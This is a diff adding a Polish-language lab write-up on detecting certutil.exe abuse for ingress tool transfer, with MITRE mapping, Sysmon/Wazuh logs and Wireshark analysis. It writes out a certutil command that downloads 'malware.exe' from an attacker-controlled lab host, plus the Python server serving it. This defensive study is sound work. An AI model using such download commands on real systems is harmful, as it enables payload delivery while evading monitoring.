@@ -127,7 +127,6 @@ Sensor Sysmon zarejestrował zdarzenie jako utworzenie nowego procesu przez syst
 *Wnioski z analizy:* Uruchomienie konsoli PowerShell bezpośrednio przez proces `svchost.exe` (Schedule) w kontekście konta `SYSTEM` to podręcznikowy wskaźnik anomalii procesowej. W realnym środowisku produkcyjnym taki schemat zachowania natychmiast kwalifikuje hosta do pełnej izolacji sieciowej, ponieważ potwierdza udane złośliwe zagnieżdżenie się w systemie i eskalację uprawnień.
 
 
-
 ---
 
 ## Case Study 4: TCP SYN Stealth Scan & Packet Inspection (Wireshark Forensics)
@@ -158,3 +157,44 @@ Filtrowanie ruchu za pomocą reguły `ip.addr == 10.0.2.4 and tcp` ujawniło pow
 
 
 *Wnioski z analizy:* Masowe pojawianie się pakietów `RST` bezpośrednio po otrzymaniu odpowiedzi `SYN-ACK` z danego adresu IP to jednoznaczny, sieciowy wskaźnik intruzji (IoC) wskazujący na zautomatyzowane skanowanie środowiska. W systemach klasy Network Detection and Response (NDR) lub na zaporach sieciowych, wykrycie takiej sekwencji z jednego źródła w krótkim oknie czasowym automatycznie wyzwala regułę progową i skutkuje natychmiastowym zablokowaniem IP napastnika.
+
+## Case Study 5: Ingress Tool Transfer & LOLBins (Certutil)
+
+### 1. Przebieg ataku
+Celem tego ataku była symulacja pobrania złośliwego pliku (payloadu) z serwera kontrolowanego przez atakującego na maszynę ofiary. Aby uniknąć wykrycia przez proste mechanizmy monitorujące ruch z przeglądarek internetowych, wykorzystałem zaufane narzędzie administracyjne Windows – `certutil.exe`. Narzędzie to domyślnie służy do zarządzania certyfikatami, jednak posiada wbudowaną funkcję pobierania plików z sieci, co adwersarze często wykorzystują. 
+
+* **Przygotowanie serwera na Kali Linux (10.0.2.5):**
+    Wygenerowałem testowy plik wykonywalny i uruchomiłem prosty serwer HTTP w Pythonie, aby udostępnić go w sieci lokalnej.
+    ```bash
+    echo "Zlosliwy kod" > malware.exe
+    python3 -m http.server 80
+    ```
+
+* **Pobranie pliku z poziomu Windows (10.0.2.4):**
+    Na maszynie ofiary uruchomiłem klasyczny Wiersz polecenia (`cmd.exe`) i wykonałem polecenie wymuszające pobranie pliku z ominięciem cache'u, zapisując go bezpośrednio do publicznego folderu.
+    ```cmd
+    certutil.exe -urlcache -split -f "[http://10.0.2.5/malware.exe](http://10.0.2.5/malware.exe)" C:\Users\Public\malware.exe
+    ```
+
+### 2. Mapowanie do MITRE ATT&CK
+* **Taktyka:** Command and Control ([TA0011](https://attack.mitre.org/tactics/TA0011/)) $\rightarrow$ **Technika:** Ingress Tool Transfer ([T1105](https://attack.mitre.org/techniques/T1105/))
+* **Taktyka:** Defense Evasion ([TA0005](https://attack.mitre.org/tactics/TA0005/)) $\rightarrow$ **Technika:** System Binary Proxy Execution ([T1218](https://attack.mitre.org/techniques/T1218/))
+
+### 3. Detekcja i analiza logów
+
+#### Logi systemowe: Sysmon Event ID 1 (Process Creation)
+Agent Wazuh bezbłędnie wychwycił anomalię związaną z użyciem narzędzia `certutil.exe`. Analiza szczegółów logu w systemie SIEM ujawniła argumenty wiersza poleceń, które jednoznacznie wskazują na intencję pobrania pliku z zewnętrznego źródła.
+
+* **Image:** `C:\Windows\System32\certutil.exe`
+* **CommandLine:** Obiekty `-urlcache`, `-split` oraz `-f` w połączeniu z zewnętrznym adresem IP atakującego to klasyczna sygnatura nadużycia tego narzędzia.
+
+<img width="877" height="571" alt="certutil" src="https://github.com/user-attachments/assets/13410b5e-501b-4f3f-8f54-064d77c39dfd" />
+
+#### Analiza ruchu sieciowego: Wireshark PCAP
+Dodatkowo przeanalizowałem ruch sieciowy, nasłuchując na interfejsie maszyny. Filtrowanie protokołu `http` ukazało jawne zapytanie `GET /malware.exe HTTP/1.1`. 
+
+Kluczowym znaleziskiem w warstwie aplikacji (nagłówki HTTP) było pole `User-Agent`, które przedstawiło się jako `CertUtil URL Agent`. Stanowi to bardzo mocny wskaźnik kompromitacji (IoC) na poziomie sieci, który pozwala na łatwe stworzenie reguły blokującej w systemach IDS/IPS (np. Suricata lub Snort).
+
+<img width="1043" height="742" alt="wireshark" src="https://github.com/user-attachments/assets/fe91a485-94c2-4f7c-9581-2d45e8a021fb" />
+
+*Wnioski z analizy:* Narzędzia typu LOLBins stanowią ogromne wyzwanie dla klasycznych systemów antywirusowych, ponieważ sam plik `certutil.exe` jest podpisany przez Microsoft i w pełni zaufany. Skuteczna detekcja opiera się tutaj wyłącznie na monitorowaniu behawioralnym – korelacji uruchamianego procesu z jego nietypowymi argumentami (wiersz poleceń) oraz na wychwytywaniu anomalii sieciowych w warstwie aplikacji (specyficzny User-Agent).
